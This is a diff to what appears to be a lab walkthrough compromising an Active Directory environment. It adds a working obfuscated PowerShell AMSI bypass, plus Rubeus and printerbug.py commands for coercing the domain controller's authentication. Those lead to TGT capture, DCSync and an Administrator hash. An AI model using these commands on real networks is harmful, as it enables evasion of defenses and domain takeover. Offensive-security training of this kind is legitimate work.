@@ -12,6 +12,12 @@ image:
 
 ## Roaster
 
+### Bla bla bla
+
+Having been inactive for some time, majorly due to school work, I'm finally back again and here for some more hacks.
+
+I worked on this machine recently and decided to write a walkthrough for it because, well, I've mostly written about **pwn** challenges so far. Figured it was time to give AD some love. 😄
+
 ### Overview
 
 This lab is a Windows environment designed to explore and exploit a range of Active Directory attack techniques, including Kerberos attacks, security evasion, privilege escalation, and delegation vulnerabilities, helping sharpen your skills in AD exploitation and offensive security.
@@ -338,6 +344,10 @@ But... we can bypass this by patching the `amsiInitFailed` field in PowerShell's
 
 ![enum15](enum15.png)
 
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
+```
+
 > From the image, we can see that before patching, using the string amsiUtils triggers AMSI. After applying the patch, however, we can use the same string without triggering AMSI.
 
 With AMSI bypassed, we can now load and execute `PowerUp.ps1`.
@@ -406,3 +416,68 @@ Now that a new user whose credential is known is created, we can dump the local 
 
 ![enum17](enum17.png)
 ![enum18](enum18.png)
+
+### DC
+
+Since we have Administrator access on `WSRV`, we can pillage for credentials by dumping LSASS, inspecting saved credentials, Kerberos tickets etc.
+
+But on doing that, I didn't get any thing..
+
+With a valid domain credential already obtained, I went ahead and enumerated using `rusthound-ce`.
+
+![enum19](enum19.png)
+
+Loaded the zip file into bloodhound...
+
+Checking on the already compromised server, I saw this.
+
+![enum20](enum20.png)
+
+`WSRV.SECDOJO.LOCAL` is configured for unconstrained delegation.
+
+Unconstrained delegation allows a trusted service, in this case `WSRV`, to obtain and use a user's delegated Kerberos credentials when that user authenticates to the service. This can potentially allow the service to impersonate the user when accessing other services.
+
+One way to abuse unconstrained delegation is to:
+- Wait for a user to authenticate to `WSRV`, allowing their Kerberos credentials to become available on the delegated host.
+- Coerce the `DC` into authenticating to `WSRV`, for example by leveraging the Printer Bug in the Print Spooler service, and capture the DC's delegated Kerberos credentials.
+
+The second approach is preferable because it doesn't require waiting for a user to naturally authenticate to `WSRV`.. we can actively trigger the authentication instead.
+
+I made use of `printerbug.py` from the krbrelayx toolkit alongside `Rubeus` and `mimikatz` to exploit the unconstrained delegation configuration.
+
+First, we RDP into `WSRV` as john and open an elevated `cmd.exe`.
+
+![enum22](enum22.png)
+
+We then use Rubeus to monitor for incoming Kerberos authentication:
+
+![enum23](enum23.png)
+
+```powershell
+Rubeus.exe monitor /interval:5 /nowrap
+```
+
+Next, we trigger the authentication from the domain controller using the Printer Bug:
+
+![enum24](enum24.png)
+
+```bash
+python3 printerbug.py secdojo.local/cody.gardner:'Password2008'@10.8.0.100 wsrv.secdojo.local
+```
+
+Back in Rubeus, we can see that the coerced authentication resulted in the DC machine account (DC$) TGT being captured:
+
+![enum25](enum25.png)
+
+With the TGT obtained, we can inject it into our current session and perform a DCSync attack against the domain controller:
+
+![enum26](enum26.png)
+![enum27](enum27.png)
+
+This gives us the NTLM hash for the domain `Administrator` account. We can then use the recovered hash to authenticate to `DC` via WinRM:
+
+![enum28](enum28.png)
+
+And there you have it, folks.. that's how I owned these servers! 🔥
+
+ありがとうございます！😊
